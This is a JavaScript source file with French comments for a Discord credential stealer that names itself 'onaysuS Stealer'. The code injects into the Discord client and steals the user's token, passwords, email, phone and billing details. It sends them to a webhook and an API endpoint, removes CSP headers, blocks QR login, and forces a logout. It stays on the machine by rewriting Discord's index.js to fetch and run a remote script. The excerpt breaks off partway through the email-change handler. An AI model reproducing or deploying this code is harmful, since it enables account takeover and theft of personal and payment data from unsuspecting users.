// Désactive la vérification du certificat TLS pour les requêtes HTTPS
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;

// Importe les modules requis
const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

// Récupère le nom de l'ordinateur à partir de la variable d'environnement COMPUTERNAME
var computerName = process.env.COMPUTERNAME;

// Définit le script pour obtenir le jeton d'accès Discord
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;

// Définit le script de déconnexion
var logOutScript = `function getLocalStoragePropertyDescriptor(){
  const o=document.createElement("iframe");
  document.head.append(o);
  const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");
  return o.remove(),e
}
Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());
const localStorage=getLocalStoragePropertyDescriptor().get.call(window);
localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();
console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`

// Vérifie si le fichier "d3dcompiler.dlll" existe pour déterminer si la déconnexion doit être effectuée
var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false;



var config = {
    // Option pour déconnecter automatiquement l'utilisateur (true ou false)
    "logout": "true",

    // Option pour afficher une notification lors de la déconnexion (true ou false)
    "logout-notify": "true",

    // Option pour afficher une notification lors de l'initialisation (true ou false)
    "init-notify": "true",

    // Couleur de l'embed (dans un format numérique)
    "embed-color": 2895667,

    // Nom du créateur du code
    creator: "onaysus",

    // Lien de transfert (peut contenir des paramètres à remplacer)
    transfer_link: `%TRANSFER_URL%`,

    // URL du script d'injection à utiliser
    injection_url: "https://raw.githubusercontent.com/onaysuS/onaysus/main/inj.js",

    // URL du webhook pour les notifications
    webhook: "%WEBHOOK%",

    // URL de l'API ou de l'endroit où le code sera placé
    Placed: "%API_URL%",

    // Configuration des filtres pour les requêtes web
    Filter: {
        "urls": [
            // Liste des URL à filtrer
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },

    // Configuration des URL pour les requêtes terminées (onCompleted)
    onCompleted: {
        "urls": [
            // Liste des URL pour lesquelles les requêtes terminées sont traitées
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    }
};


// Fonction asynchrone pour exécuter un script dans la fenêtre Electron
async function execScript(str) {
    // Obtenir la première fenêtre du navigateur Electron
    var window = electron.BrowserWindow.getAllWindows()[0];

    // Exécuter le script dans la fenêtre et attendre le résultat
    var script = await window.webContents.executeJavaScript(str, true);

    // Retourner le résultat du script ou null si aucun résultat
    return script || null;
}

// Fonction asynchrone pour créer un objet d'intégration (embed)
const makeEmbed = async ({
    title,
    fields,
    image,
    thumbnail,
    description
}) => {
    // Paramètres de l'objet d'intégration
    var params = {
        username: "onaysuS Stealer",
        avatar_url: "https://raw.githubusercontent.com/onaysuS/onaysus/main/img/xd.png",
        content: "",
        embeds: [{
            title: title,
            color: config["embed-color"],
            fields: fields,
            description: description ?? "", // Description (ou vide si non définie)
            author: {
                name: `onaysuS Stealer`
            },
            footer: {
                text: `�[${config.creator}]`
            },
        }]
    };

    // Ajouter une image si elle est spécifiée
    if (image) params.embeds[0].image = {
        url: image
    }

    // Ajouter une miniature si elle est spécifiée
    if (thumbnail) params.embeds[0].thumbnail = {
        url: thumbnail
    }

    // Retourner les paramètres de l'objet d'intégration
    return params;
}

// Fonction asynchrone pour obtenir l'adresse IP externe de la machine
const getIP = async () => {
    // Exécute un script qui effectue une requête HTTP vers un service qui renvoie l'adresse IP externe au format JSON
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/json", false );
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);`);

    // Retourne l'adresse IP extraite du résultat JSON
    return json.ip;
}

// Fonction pour effectuer une requête GET avec un token d'authentification
const getURL = async (url, token) => {
    var c = await execScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);`)
    return c;
}

// Fonction pour obtenir une URL de GIF ou de PNG en fonction du type de contenu
const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"]

    // Obtient les en-têtes HTTP de l'URL
    var headers = await new Promise(resolve => {
        https.get(url, res => resolve(res.headers))
    })
    var type = headers["content-type"]

    // Vérifie le type de contenu et retourne l'URL appropriée (GIF ou PNG)
    if (type == "image/gif") return url + tt[0]
    else return url + tt[1]
}

// Fonction pour obtenir des badges en fonction d'un drapeau (flags)
const GetBadges = (e) => {
    var n = "";
    // Vérifie les bits du drapeau et ajoute les badges correspondants
    1 == (1 & e) && (n += "<:staff:891346298932981783> ");
    2 == (2 & e) && (n += "<:partner:1041639667226914826> ");
    4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> ");
    8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> ");
    64 == (64 & e) && (n += "<:bravery:874750808388952075> ");
    128 == (128 & e) && (n += "<:brilliance:874750808338608199> ");
    256 == (256 & e) && (n += "<:balance:874750808267292683> ");
    512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> ");
    16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> ");
    4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> ");
    131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> ");
    "" == n && (n = ":x:");
    return n;
}

// Fonction pour obtenir des badges (réduits) en fonction d'un drapeau (flags)
const GetRBadges = (e) => {
    var n = "";
    // Vérifie les bits du drapeau et ajoute les badges correspondants (version réduite)
    1 == (1 & e) && (n += "<:staff:891346298932981783> ");
    2 == (2 & e) && (n += "<:partner:1041639667226914826> ");
    4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> ");
    8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> ");
    512 == (512 & e) && (n += "<:early:944071770506416198> ");
    16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> ");
    131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> ");
    "" == n && (n = ":x:");
    return n;
}

// Fonction pour obtenir un message sur le statut NSFW en fonction de la valeur booléenne
const GetNSFW = (bouki) => {
    switch (bouki) {
        case true:
            return ":underage: `NSFW Autorisé`"; // NSFW est autorisé
        case false:
            return ":underage: `NSFW Non Autorisé`"; // NSFW n'est pas autorisé
        default:
            return "Idk bro you got me"; // Valeur inconnue (je ne sais pas, mec, tu me dépasses)
    }
}

// Fonction pour obtenir un message sur le statut de l'authentification à deux facteurs (A2F) en fonction de la valeur booléenne
const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return ":lock: `A2F Activé`"; // Authentification à deux facteurs activée
        case false:
            return ":lock: `A2F Non Activé`"; // Authentification à deux facteurs non activée
        default:
            return "Idk bro you got me"; // Valeur inconnue (je ne sais pas, mec, tu me dépasses)
    }
}


// Fonction pour analyser la liste d'amis et trouver les amis rares
const parseFriends = friends => {
    try {
        // Filtrer les amis de type 1 (amis réels)
        var real = friends.filter(x => x.type == 1)
        var rareFriends = ""
        for (var friend of real) {
            // Obtenir les badges des amis
            var badges = GetRBadges(friend.user.public_flags)
            if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
        }
        if (!rareFriends) rareFriends = "Pas d'amis rares"
        return {
            len: real.length, // Nombre total d'amis réels
            badges: rareFriends // Liste des amis rares avec leurs badges
        }
    } catch (err) {
        return ":x:" // En cas d'erreur, renvoyer ":x:"
    }
}

// Fonction pour analyser les facturations (billing)
const parseBilling = billings => {
    var Billings = ""
    try {
        if (!billings) return Billings = ":x:"; // Si les facturations sont inexistantes, renvoyer ":x:"
        billings.forEach(res => {
            if (res.invalid) return // Ignorer les facturations invalides
            switch (res.type) {
                case 1:
                    Billings += ":heavy_check_mark: :credit_card:" // Facturation par carte de crédit
                    break
                case 2:
                    Billings += ":heavy_check_mark: <:paypal:896441236062347374>" // Facturation via PayPal
            }
        })
        if (!Billings) Billings = ":x:" // Si aucune facturation n'est trouvée, renvoyer ":x:"
        return Billings
    } catch (err) {
        return ":x:" // En cas d'erreur, renvoyer ":x:"
    }
}

// Fonction pour calculer une date en ajoutant un certain nombre de mois à une date donnée
const calcDate = (date, months) => new Date(date.setMonth(date.getMonth() + months))

// Fonction pour obtenir le type de Nitro
const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return ":x:" // Type de Nitro inconnu
        case 1:
            return "<:946246402105819216:962747802797113365>" // Nitro Classic
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>" // Nitro Classic si la date d'adhésion à un serveur n'est pas définie
            var now = new Date(Date.now())
            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i] // Type de Nitro Boost en fonction de la durée
    }
}

// Fonction pour obtenir la langue à partir du code de langue
function GetLangue(read) {
    var languages = {
        "fr": ":flag_fr: French",
        "da": ":flag_dk: Dansk",
        "de": ":flag_de: Deutsch",
        "en-GB": ":england: English (UK)",
        "en-US": ":flag_us: USA",
        "en-ES": ":flag_es: Espagnol",
        "hr": ":flag_hr: Croatian",
        "it": ":flag_it: Italianio",
        "lt": ":flag_lt: Lithuanian",
        "hu": ":flag_no::flag_hu: Hungarian",
        "no": ":flag_no: Norwegian",
        "pl": ":flag_pl: Polish",
        'pr-BR': ":flag_pt: Portuguese",
        "ro": ":flag_ro: Romanian",
        "fi": ":flag_fi: Finnish",
        "sv-SE": ":flag_se: Swedish",
        "vi": ":flag_vn: Vietnamese",
        "tr": ":flag_tr: Turkish",
        "cs": ":flag_cz: Czech",
        "el": ":flag_gr: Greek",
        "bg": ":flag_bg: Bulgarian",
        "ru": ":flag_ru: Russian",
        "uk": ":flag_ua: Ukrainian",
        "hi": ":flag_in: Indian",
        "th": ":flag_tw: Taiwanese",
        "zh-CN": ":flag_cn: Chinese-China",
        "ja": ":flag_jp: Japanese",
        "zh-TW": ":flag_cn: Chinese-Taiwanese",
        "ko": ":flag_kr: Korean"
    }

    var langue = languages[read] || "No Languages Detected ????";
    return langue
}

const post = async (params) => {
    // Convertir les paramètres en format JSON
    params = JSON.stringify(params);

    // Obtenir le token en utilisant la fonction execScript
    var token = await execScript(tokenScript);

    // Créer un objet JSON contenant les données et le token
    var requestData = JSON.stringify({
        data: params,
        token: token
    });

    // Boucler à travers les URL de destination (config.Placed et config.webhook)
    [config.Placed, config.webhook].forEach(res => {
        // Ignorer les URL spéciales
        if (res == "%API" + "_URL%") return;
        if (res == "%\x57EBHOOK%") return;

        // Créer une instance de l'objet URL en fonction de l'URL actuelle
        const url = new URL(res);

        // Définir les options de la requête HTTP
        const options = {
            host: url.hostname,
            port: url.port,
            path: url.pathname,
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            }
        }

        // Créer une requête HTTPS avec les options définies
        const req = https.request(options);

        // Gérer les erreurs de la requête
        req.on("error", (err) => {
            console.log(err);
        });

        // Écrire les données à la requête (différentes données selon l'URL)
        req.write(res == config.Placed ? requestData : params);

        // Envoyer la requête
        req.end();
    });
}

const FirstTime = async () => {
    // Obtenir le token en utilisant la fonction execScript
    var token = await execScript(tokenScript)

    // Vérifier si la notification initiale est activée dans la configuration
    if (config['init-notify'] !== "true") return true


    if (fs.existsSync(__dirname + "/onaysuS")) {
        try {
            fs.rmdirSync(__dirname + "/onaysuS")
        } catch (err) {
            console.log(err)
        }
        var ip = await getIP()
        var {
            appPath,
            appName
        } = path
        var client_discord = appName
        if (!token) {
            var params = await makeEmbed({
                title: "onaysuS Stealer Initialized",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
                    inline: !1
                }]
            })
        } else {
            var user = await getURL("https://discord.com/api/v8/users/@me", token)
            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

            var Billings = parseBilling(billing)
            var Friends = parseFriends(friends)
            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/onaysuS/onaysus/main/img/xd.png"
            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/onaysuS/onaysus/main/banner.gif"

            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: " onaysuS Stealer Initialized",
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
                fields: [{
                    name: "Username <:username:1041634536733290596> ",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID <:iduser:1041634535395307520>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0
                }, {
                    name: "Nitro <a:nitro:1041639670288748634>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0
                }, {
                    name: "Badges <:badge:1041634538150973460>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0
                }, {
                    name: "Language <:language:1041640473477001236>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0
                }, {
                    name: "NSFW <a:nsfw:1041640474617839616>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !0
                }, {
                    name: "A2F <a:a2f:1040272766982692885>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0
                }, {
                    name: "onaysuS Files",
                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                    inline: !0
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
                    inline: !0
                }, {
                    name: "Email <a:email:1041639672037785691>",
                    value: `\`${user.email ?? "none"}\``,
                    inline: !0
                }, {
                    name: "Bio <a:mavikirmizi:853238372591599617>",
                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                    inline: !1
                }, {
                    name: "<a:tokens:1041634540537511957> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1
                }],
                image: userBanner,
                thumbnail: userAvatar
            })
            var params2 = await makeEmbed({
                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
        }
        await post(params)
        if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
            if (!token) {
                var params = await makeEmbed({
                    title: "onaysuS User log out (User not Logged in before)",
                    fields: [{
                        name: "Injection Info",
                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                        inline: !1
                    }]
                })
            } else {
                var user = await getURL("https://discord.com/api/v8/users/@me", token)
                var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
                var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
                var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

                var Billings = parseBilling(billing)
                var Friends = parseFriends(friends)
                if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/onaysuS/onaysus/main/img/xd.png"
                if (!user.banner) var userBanner = "https://raw.githubusercontent.com/onaysuS/onaysus/main/banner.gif"

                userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
                userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
                var params = await makeEmbed({
                    title: "onaysus Stealer Victim got logged out",
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID <:iduser:1041634535395307520>",
                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1041639670288748634>",
                        value: `${GetNitro(Nitro)}`,
                        inline: !0
                    }, {
                        name: "Badges <:badge:1041634538150973460>",
                        value: `${GetBadges(user.flags)}`,
                        inline: !0
                    }, {
                        name: "Language <:language:1041640473477001236>",
                        value: `${GetLangue(user.locale)}`,
                        inline: !0
                    }, {
                        name: "NSFW <a:nsfw:1041640474617839616>",
                        value: `${GetNSFW(user.nsfw_allowed)}`,
                        inline: !0
                    }, {
                        name: "A2F <a:a2f:1040272766982692885>",
                        value: `${GetA2F(user.mfa_enabled)}`,
                        inline: !0
                    }, {
                        name: "onaysus Files",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
                        inline: !0
                    }, {
                        name: "Email <a:email:1041639672037785691>",
                        value: `\`${user.email}\``,
                        inline: !0
                    }, {
                        name: "Phone :mobile_phone:",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "Bio <a:mavikirmizi:853238372591599617>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<a:tokens:1041634540537511957> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                        inline: !1
                    }],
                    image: userBanner,
                    thumbnail: userAvatar
                })
                var params2 = await makeEmbed({
                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    image: userBanner,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])
            }

            fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
            await execScript(logOutScript)
            doTheLogOut = true
            await post(params)
        }

        return false
    }
}

const path = (function () {
    // Obtenir le chemin de l'application Electron en utilisant app.getAppPath()
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");

    // Supprimer le dernier élément du tableau (le nom du fichier de l'application)
    appPath.pop();

    // Joindre les éléments du tableau pour obtenir le chemin du répertoire de l'application
    appPath = appPath.join("/");

    // Obtenir le nom de l'application Electron en utilisant app.getName()
    var appName = electron.app.getName();

    // Retourner un objet avec les propriétés appPath et appName
    return {
        appPath,
        appName
    };
}());

const checUpdate = () => {
    // Obtient le chemin de l'application et le nom de l'application.
    var {
        appPath,
        appName
    } = path;

    // Si doTheLogOut est faux, effectue une déconnexion.
    if (!doTheLogOut) execScript(logOutScript);

    // Définit différents chemins de fichiers.
    var ressource = `${appPath}/app`;
    var indexFile = __filename.replace(/\\/g, "/");
    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`;
    var package = `${ressource}/package.json`;
    var index = `${ressource}/index.js`;

    // Si le répertoire "app" n'existe pas, le crée.
    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource);

    // Écrit un fichier "package.json" dans le répertoire "app".
    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`);

    // Crée un script qui effectue plusieurs opérations.
    var script = `const fs = require("fs"), https = require("https")

var index = "${indexFile}"
var betterDiscord = "${betterDiscord}"

var negger = fs.readFileSync(index).toString()
if (negger == "module.exports = require('./core.asar');") init()

function init() {
    // Effectue une requête HTTPS pour télécharger du contenu depuis une URL.
    https.get("${config.injection_url}", res => {
        var chunk = ""
        res.on("data", data => chunk += data)
        res.on("end", () => fs.writeFileSync(index, chunk.replace("%\x57EBHOOK%", "${config.webhook}")))
    }).on("error", (err) => setTimeout(init(), 10000));
}

// Nécessite le fichier "app.asar".
require("${appPath}/app.asar")

// Si le fichier "betterdiscord.asar" existe, le nécessite également.
if (fs.existsSync(betterDiscord)) require(betterDiscord)`;

    // Écrit le contenu du script dans le fichier "index.js".
    fs.writeFileSync(index, script);
    return;
}
electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    // Attend que l'application Electron soit prête.
    await electron.app.whenReady();

    // Exécute la fonction FirstTime().
    await FirstTime();

    // Si l'URL commence par "wss://remote-auth-gateway", annule la requête.
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });

    // Exécute la fonction checUpdate().
    checUpdate();

    // Appelle le callback sans annuler la requête.
    callback({});
});

electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
    // Supprime les en-têtes de sécurité liés à la politique de sécurité du contenu.
    delete request.responseHeaders['content-security-policy'];
    delete request.responseHeaders['content-security-policy-report-only'];

    // Ajoute un en-tête permettant le contrôle des autorisations de ressource.
    callback({
        responseHeaders: {
            ...request.responseHeaders,
            'Access-Control-Allow-Headers': '*',
        },
    });
});

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return
    if (request.statusCode !== 200) return
    try {
        var data = JSON.parse(request.uploadData[0].bytes)
    } catch (err) {
        var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
    }
    var token = await execScript(tokenScript)
    var ip = await getIP()
    var user = await getURL("https://discord.com/api/v8/users/@me", token)
    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/onaysuS/onaysus/main/img/xd.png"
    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/onaysuS/onaysus/main/banner.gif"

    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
    var Billings = parseBilling(billing)
    var Friends = parseFriends(friends)
    var {
        appPath,
        appName
    } = path
    var client_discord = appName

    switch (true) {
        case request.url.endsWith("login"):
            var password = data.password
            var params = await makeEmbed({
                title: "onaysus Stealer User Login",
                color: config['embed-color'],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [{
                    name: "Username <:username:1041634536733290596> ",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: !0
                }, {
                    name: "ID <:iduser:1041634535395307520>",
                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                    inline: !0
                }, {
                    name: "Nitro <a:nitro:1041639670288748634>",
                    value: `${GetNitro(Nitro)}`,
                    inline: !0
                }, {
                    name: "Badges <:badge:1041634538150973460>",
                    value: `${GetBadges(user.flags)}`,
                    inline: !0
                }, {
                    name: "Language <:language:1041640473477001236>",
                    value: `${GetLangue(user.locale)}`,
                    inline: !0
                }, {
                    name: "NSFW <a:nsfw:1041640474617839616>",
                    value: `${GetNSFW(user.nsfw_allowed)}`,
                    inline: !0
                }, {
                    name: "A2F <a:a2f:1040272766982692885>",
                    value: `${GetA2F(user.mfa_enabled)}`,
                    inline: !0
                }, {
                    name: "onaysus Files",
                    value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                    inline: !0
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
                    inline: !0
                }, {
                    name: "Email <a:email:1041639672037785691>",
                    value: `\`${user.email}\``,
                    inline: !0
                }, {
                    name: "Phone :mobile_phone:",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: !0
                }, {
                    name: "<a:password:1041639669047238676> Password",
                    value: `\`${password}\``,
                    inline: !0
                }, {
                    name: "Bio <a:mavikirmizi:853238372591599617>",
                    value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                    inline: !1
                }, {
                    name: "<a:tokens:1041634540537511957> Token",
                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                    inline: !1
                }],

                thumbnail: userAvatar,
                image: userBanner
            })

            var params2 = await makeEmbed({
                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])

            await post(params)
            break
        case request.url.endsWith("users/@me"):
            if (!data.password) return
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "onaysus Stealer Detect Password Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID <:iduser:1041634535395307520>",
                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1041639670288748634>",
                        value: `${GetNitro(Nitro)}`,
                        inline: !0
                    }, {
                        name: "Badges <:badge:1041634538150973460>",
                        value: `${GetBadges(user.flags)}`,
                        inline: !0
                    }, {
                        name: "Language <:language:1041640473477001236>",
                        value: `${GetLangue(user.locale)}`,
                        inline: !0
                    }, {
                        name: "NSFW <a:nsfw:1041640474617839616>",
                        value: `${GetNSFW(user.nsfw_allowed)}`,
                        inline: !0
                    }, {
                        name: "A2F <a:a2f:1040272766982692885>",
                        value: `${GetA2F(user.mfa_enabled)}`,
                        inline: !0
                    }, {
                        name: "onaysus Files",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
                        inline: !0
                    }, {
                        name: "Email <a:email:1041639672037785691>",
                        value: `\`${user.email}\``,
                        inline: !0
                    }, {
                        name: "Phone :mobile_phone:",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "<a:password:1041639669047238676> Old Password",
                        value: `\`${data.password}\``,
                        inline: !0
                    }, {
                        name: "<a:password:1041639669047238676> New Password",
                        value: `\`${data.new_password}\``,
                        inline: !0
                    }, {
                        name: "Bio <a:mavikirmizi:853238372591599617>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<a:tokens:1041634540537511957> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                        inline: !1
                    },],

                    thumbnail: userAvatar,
                    image: userBanner
                })

                var params2 = await makeEmbed({
                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    image: userBanner,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])

                await post(params)
            }
            if (data.email) {
                var params = await makeEmbed({
                    title: "onaysus Stealer Detect Email Changed",
                    color: config['embed-color'],
                    description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                    fields: [{
                        name: "Username <:username:1041634536733290596> ",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID <:iduser:1041634535395307520>",
                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
                        inline: !0
                    }, {
                        name: "Nitro <a:nitro:1041639670288748634>",
                        value: `${GetNitro(Nitro)}`,
                        inline: !0
                    }, {
                        name: "Badges <:badge:1041634538150973460>",
                        value: `${GetBadges(user.flags)}`,
                        inline: !0
                    }, {
                        name: "Language <:language:1041640473477001236>",
                        value: `${GetLangue(user.locale)}`,
                        inline: !0
                    }, {
